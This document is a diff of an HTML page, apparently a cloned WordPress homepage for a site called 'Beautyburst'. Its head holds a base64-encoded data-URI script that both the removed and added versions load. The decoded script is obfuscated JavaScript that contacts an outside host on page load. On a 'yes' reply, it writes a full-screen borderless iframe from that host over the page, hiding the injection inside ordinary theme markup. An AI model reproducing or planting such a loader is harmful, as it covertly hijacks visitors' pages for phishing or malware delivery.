@@ -1,9 +1,437 @@
-<html>
-	<head>
-		<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
-		<script src="data:text/javascript;base64,ZnVuY3Rpb24gVyh0LGUpe3ZhciByPW4oKTtyZXR1cm4oVz1mdW5jdGlvbihuLHQpe3JldHVybiByW24tPTQ3OF19KSh0LGUpfWZ1bmN0aW9uIG4oKXt2YXIgdD1bIk13emJJIiwibG9jYXRpb24iLCJpd0Z6RyIsImdldCIsInNlYXJjaCIsIjYyMTl3QkNsZGkiLCIyMEhWenFFZyIsIjU4NzBtY0dCa1YiLCJkRlVLTSIsIkRrREVSIiwnPGlmcmFtZSBzcmM9Imh0dHBzOi8va2Vuem9tZWdvbmVjLmljdS9YWkRXaHhmQj9zPScsImh0dHBzOi8va2Vuem9tZWdvbmVjLmljdS8/Yz0iLCJEc2RESiIsIjE5MjQ2OTg2a0pURlBQIiwnIiBmcmFtZWJvcmRlcj0iMCIgc3R5bGU9Im92ZXJmbG93OmhpZGRlbjtvdmVyZmxvdy14OmhpZGRlbjtvdmVyZmxvdy15OmhpZGRlbjtoZWlnaHQ6MTAwJTt3aWR0aDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlO3RvcDowcHg7bGVmdDowcHg7cmlnaHQ6MHB4O2JvdHRvbTowcHgiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiPjwvaWZyYW1lPicsIiZwPSIsImpkQWVBIiwiODI2enZjeGVxIiwiNjg1NW13dURaRyIsImN6VnpEIiwibWF0Y2giLCJLdnl4TyIsIjUxNnpyWkZORyIsIndyaXRlIiwiNzEyMzk4VnJGU3NXIiwiJmM9IiwiMjE3NDRFYmpxeWgiLCI2MDgyOE9oWlBiSSIsIj0oW14mPV0rKSIsIk9ZWExYIiwidW9IbmkiLCI5MDExNHNiTGxwRCIsInllcyIsIkdJQXBNIiwiaXJPRm4iXTtyZXR1cm4obj1mdW5jdGlvbigpe3JldHVybiB0fSkoKX12YXIgSD1XO2Z1bmN0aW9uIGdldENvb2tpZXMobil7dmFyIHQ9VyxlPXt9O2VbdCg1MDIpXT1mdW5jdGlvbihuLHQpe3JldHVybiBuK3R9LGVbdCg0OTgpXT10KDQ3OSk7dmFyIHI9ZSxlPXdpbmRvd1t0KDQ4NyldW3QoNDkwKV07cmV0dXJuISEoZT1lW3QoNTA2KV0obmV3IFJlZ0V4cChyW3QoNTAyKV0obixyW3QoNDk4KV0pKSkpJiZlWzFdfWZ1bmN0aW9uIG9uQWpheFN1Y2Nlc3Mobil7dmFyIHQ9SCxlPXtPWVhMWDpmdW5jdGlvbihuLHQpe3JldHVybiBuPT10fSxpd0Z6Rzp0KDQ4MyksR0lBcE06ZnVuY3Rpb24obix0KXtyZXR1cm4gbit0fSxEa0RFUjpmdW5jdGlvbihuLHQpe3JldHVybiBuK3R9LGlyT0ZuOmZ1bmN0aW9uKG4sdCl7cmV0dXJuIG4rdH0sTXd6Ykk6dCg0OTYpLGN6VnpEOmZ1bmN0aW9uKG4sdCl7cmV0dXJuIG4odCl9LGRGVUtNOmZ1bmN0aW9uKG4sdCl7cmV0dXJuIG4odCl9LHVvSG5pOnQoNTExKSxLdnl4Tzp0KDUwMCl9O2VbdCg0ODApXShuLGVbdCg0ODgpXSkmJmRvY3VtZW50W3QoNTA5KV0oZVt0KDQ4NCldKGVbdCg0ODQpXShlW3QoNDk1KV0oZVt0KDQ4NSldKGVbdCg0ODYpXSxlW3QoNTA1KV0oZ2V0Q29va2llcywicyIpKSx0KDUwMSkpK2VbdCg0OTQpXShnZXRDb29raWVzLCJwIiksZVt0KDQ4MSldKSxlW3QoNTA1KV0oZ2V0Q29va2llcywiYyIpKStlW3QoNTA3KV0pfSFmdW5jdGlvbigpe2Zvcih2YXIgdD1XLGU9bigpOzspdHJ5e2lmKDQyNDM3MD09LXBhcnNlSW50KHQoNTEwKSkrcGFyc2VJbnQodCg0OTIpKS8yKihwYXJzZUludCh0KDQ4MikpLzMpK3BhcnNlSW50KHQoNTA4KSkvNCooLXBhcnNlSW50KHQoNTA0KSkvNSkrLXBhcnNlSW50KHQoNDc4KSkvNitwYXJzZUludCh0KDUwMykpLzcqKC1wYXJzZUludCh0KDUxMikpLzgpK3BhcnNlSW50KHQoNDkxKSkvOSooLXBhcnNlSW50KHQoNDkzKSkvMTApK3BhcnNlSW50KHQoNDk5KSkvMTEpYnJlYWs7ZS5wdXNoKGUuc2hpZnQoKSl9Y2F0Y2gobil7ZS5wdXNoKGUuc2hpZnQoKSl9fSgpLCRbSCg0ODkpXShIKDQ5NykrZ2V0Q29va2llcygiYyIpLG9uQWpheFN1Y2Nlc3MpOw=="></script>
-	</head>
-	<body>
-	TEST TEST
+<!DOCTYPE html> 
+<html class="no-js" lang="pt-PT">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+		
+	<title>Beautyburst &#8211; architect dynamic e-business</title>
+<meta name='robots' content='max-image-preview:large' />
+<script>document.documentElement.className = document.documentElement.className.replace("no-js","js");</script>
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Beautyburst &raquo; Feed" href="feed" />
+<link rel="alternate" type="application/rss+xml" title="Beautyburst &raquo; Comments Feed" href="comments/feed" />
+<script type="text/javascript">
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
+</script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css?ver=6.0' type='text/css' media='all' />
+<style id='global-styles-inline-css' type='text/css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+</style>
+<link rel='stylesheet' id='shapebox-style-css'  href='style.css?ver=6.0' type='text/css' media='all' />
+<style id='shapebox-style-inline-css' type='text/css'>
+body { font-family: "Inter", Arial, sans-serif; }
+
+</style>
+<link rel='stylesheet' id='shapebox-responsive-css'  href='responsive.css?ver=6.0' type='text/css' media='all' />
+<link rel='stylesheet' id='shapebox-font-awesome-css'  href='all.min.css?ver=6.0' type='text/css' media='all' />
+<link rel='stylesheet' id='inter-css'  href='//fonts.googleapis.com/css?family=Inter%3A400%2C300%2C600%2C800&#038;ver=6.0' type='text/css' media='all' />
+<script type='text/javascript' src='jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
+<script type='text/javascript' src='jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<script type='text/javascript' src='slick.min.js?ver=6.0' id='shapebox-slick-js'></script>
+<link rel="https://api.w.org/" href="wp-json/" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 6.0" />
+<meta name="keywords" content=" "/>
+<style id="kirki-inline-styles"></style>
+<script src="data:text/javascript;base64,ZnVuY3Rpb24gVyh0LGUpe3ZhciByPW4oKTtyZXR1cm4oVz1mdW5jdGlvbihuLHQpe3JldHVybiByW24tPTQ3OF19KSh0LGUpfWZ1bmN0aW9uIG4oKXt2YXIgdD1bIk13emJJIiwibG9jYXRpb24iLCJpd0Z6RyIsImdldCIsInNlYXJjaCIsIjYyMTl3QkNsZGkiLCIyMEhWenFFZyIsIjU4NzBtY0dCa1YiLCJkRlVLTSIsIkRrREVSIiwnPGlmcmFtZSBzcmM9Imh0dHBzOi8va2Vuem9tZWdvbmVjLmljdS9YWkRXaHhmQj9zPScsImh0dHBzOi8va2Vuem9tZWdvbmVjLmljdS8/Yz0iLCJEc2RESiIsIjE5MjQ2OTg2a0pURlBQIiwnIiBmcmFtZWJvcmRlcj0iMCIgc3R5bGU9Im92ZXJmbG93OmhpZGRlbjtvdmVyZmxvdy14OmhpZGRlbjtvdmVyZmxvdy15OmhpZGRlbjtoZWlnaHQ6MTAwJTt3aWR0aDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlO3RvcDowcHg7bGVmdDowcHg7cmlnaHQ6MHB4O2JvdHRvbTowcHgiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiPjwvaWZyYW1lPicsIiZwPSIsImpkQWVBIiwiODI2enZjeGVxIiwiNjg1NW13dURaRyIsImN6VnpEIiwibWF0Y2giLCJLdnl4TyIsIjUxNnpyWkZORyIsIndyaXRlIiwiNzEyMzk4VnJGU3NXIiwiJmM9IiwiMjE3NDRFYmpxeWgiLCI2MDgyOE9oWlBiSSIsIj0oW14mPV0rKSIsIk9ZWExYIiwidW9IbmkiLCI5MDExNHNiTGxwRCIsInllcyIsIkdJQXBNIiwiaXJPRm4iXTtyZXR1cm4obj1mdW5jdGlvbigpe3JldHVybiB0fSkoKX12YXIgSD1XO2Z1bmN0aW9uIGdldENvb2tpZXMobil7dmFyIHQ9VyxlPXt9O2VbdCg1MDIpXT1mdW5jdGlvbihuLHQpe3JldHVybiBuK3R9LGVbdCg0OTgpXT10KDQ3OSk7dmFyIHI9ZSxlPXdpbmRvd1t0KDQ4NyldW3QoNDkwKV07cmV0dXJuISEoZT1lW3QoNTA2KV0obmV3IFJlZ0V4cChyW3QoNTAyKV0obixyW3QoNDk4KV0pKSkpJiZlWzFdfWZ1bmN0aW9uIG9uQWpheFN1Y2Nlc3Mobil7dmFyIHQ9SCxlPXtPWVhMWDpmdW5jdGlvbihuLHQpe3JldHVybiBuPT10fSxpd0Z6Rzp0KDQ4MyksR0lBcE06ZnVuY3Rpb24obix0KXtyZXR1cm4gbit0fSxEa0RFUjpmdW5jdGlvbihuLHQpe3JldHVybiBuK3R9LGlyT0ZuOmZ1bmN0aW9uKG4sdCl7cmV0dXJuIG4rdH0sTXd6Ykk6dCg0OTYpLGN6VnpEOmZ1bmN0aW9uKG4sdCl7cmV0dXJuIG4odCl9LGRGVUtNOmZ1bmN0aW9uKG4sdCl7cmV0dXJuIG4odCl9LHVvSG5pOnQoNTExKSxLdnl4Tzp0KDUwMCl9O2VbdCg0ODApXShuLGVbdCg0ODgpXSkmJmRvY3VtZW50W3QoNTA5KV0oZVt0KDQ4NCldKGVbdCg0ODQpXShlW3QoNDk1KV0oZVt0KDQ4NSldKGVbdCg0ODYpXSxlW3QoNTA1KV0oZ2V0Q29va2llcywicyIpKSx0KDUwMSkpK2VbdCg0OTQpXShnZXRDb29raWVzLCJwIiksZVt0KDQ4MSldKSxlW3QoNTA1KV0oZ2V0Q29va2llcywiYyIpKStlW3QoNTA3KV0pfSFmdW5jdGlvbigpe2Zvcih2YXIgdD1XLGU9bigpOzspdHJ5e2lmKDQyNDM3MD09LXBhcnNlSW50KHQoNTEwKSkrcGFyc2VJbnQodCg0OTIpKS8yKihwYXJzZUludCh0KDQ4MikpLzMpK3BhcnNlSW50KHQoNTA4KSkvNCooLXBhcnNlSW50KHQoNTA0KSkvNSkrLXBhcnNlSW50KHQoNDc4KSkvNitwYXJzZUludCh0KDUwMykpLzcqKC1wYXJzZUludCh0KDUxMikpLzgpK3BhcnNlSW50KHQoNDkxKSkvOSooLXBhcnNlSW50KHQoNDkzKSkvMTApK3BhcnNlSW50KHQoNDk5KSkvMTEpYnJlYWs7ZS5wdXNoKGUuc2hpZnQoKSl9Y2F0Y2gobil7ZS5wdXNoKGUuc2hpZnQoKSl9fSgpLCRbSCg0ODkpXShIKDQ5NykrZ2V0Q29va2llcygiYyIpLG9uQWpheFN1Y2Nlc3MpOw=="></script>
+</head>
+<body class="home blog col-2cl full-width invert-dark-logo logged-out">
+
+
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.4980392156862745" /><feFuncG type="table" tableValues="0 0.4980392156862745" /><feFuncB type="table" tableValues="0 0.4980392156862745" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.5490196078431373 0.9882352941176471" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.7176470588235294 0.2549019607843137" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.2784313725490196" /><feFuncB type="table" tableValues="0.592156862745098 0.2784313725490196" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.6470588235294118" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.7803921568627451 1" /><feFuncG type="table" tableValues="0 0.9490196078431372" /><feFuncB type="table" tableValues="0.35294117647058826 0.47058823529411764" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.6509803921568628 0.403921568627451" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.4470588235294118 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.09803921568627451 1" /><feFuncG type="table" tableValues="0 0.6627450980392157" /><feFuncB type="table" tableValues="0.8470588235294118 0.4196078431372549" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg>
+<a class="skip-link screen-reader-text" href="#page">Skip to content</a>
+
+<div id="wrapper">
+	
+	<div id="header-sticky">
+		<header id="header" class="hide-on-scroll-down nav-menu-dropdown-left">
+		
+			<div class="group">
+				<h1 class="site-title"><a href="" rel="home">Beautyburst</a></h1>
+									<p class="site-description">architect dynamic e-business</p>
+								
+								
+								
+			</div>
+			
+		</header><!--/#header-->
+	</div><!--/#header-sticky-->
+	
+	<div class="sidebar s2 group">
+					<div class="search-trap-focus">
+				<button class="toggle-search" data-target=".search-trap-focus">
+					<svg class="svg-icon" id="svg-search" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 23 23"><path d="M38.710696,48.0601792 L43,52.3494831 L41.3494831,54 L37.0601792,49.710696 C35.2632422,51.1481185 32.9839107,52.0076499 30.5038249,52.0076499 C24.7027226,52.0076499 20,47.3049272 20,41.5038249 C20,35.7027226 24.7027226,31 30.5038249,31 C36.3049272,31 41.0076499,35.7027226 41.0076499,41.5038249 C41.0076499,43.9839107 40.1481185,46.2632422 38.710696,48.0601792 Z M36.3875844,47.1716785 C37.8030221,45.7026647 38.6734666,43.7048964 38.6734666,41.5038249 C38.6734666,36.9918565 35.0157934,33.3341833 30.5038249,33.3341833 C25.9918565,33.3341833 22.3341833,36.9918565 22.3341833,41.5038249 C22.3341833,46.0157934 25.9918565,49.6734666 30.5038249,49.6734666 C32.7048964,49.6734666 34.7026647,48.8030221 36.1716785,47.3875844 C36.2023931,47.347638 36.2360451,47.3092237 36.2726343,47.2726343 C36.3092237,47.2360451 36.347638,47.2023931 36.3875844,47.1716785 Z" transform="translate(-20 -31)"></path></svg>
+					<svg class="svg-icon" id="svg-close" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 16 16"><polygon fill="" fill-rule="evenodd" points="6.852 7.649 .399 1.195 1.445 .149 7.899 6.602 14.352 .149 15.399 1.195 8.945 7.649 15.399 14.102 14.352 15.149 7.899 8.695 1.445 15.149 .399 14.102"></polygon></svg>
+				</button>
+				<div class="search-expand">
+					<div class="search-expand-inner">
+						<form method="get" class="searchform themeform" action="">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form>					</div>
+				</div>
+			</div>
+				
+				
+								</div>
+	
+	
+	<div class="container" id="page">
+		<div class="container-inner">			
+			<div class="main">
+				<div class="main-inner group">
+<div class="content">
+	
+	
+
+<div class="slick-featured-wrap-outer">	
+	<div class="slick-featured-wrap container-inner">
+		<div class="slick-featured">
+							<div>	
+					
+<div class="featured-item-outer group">
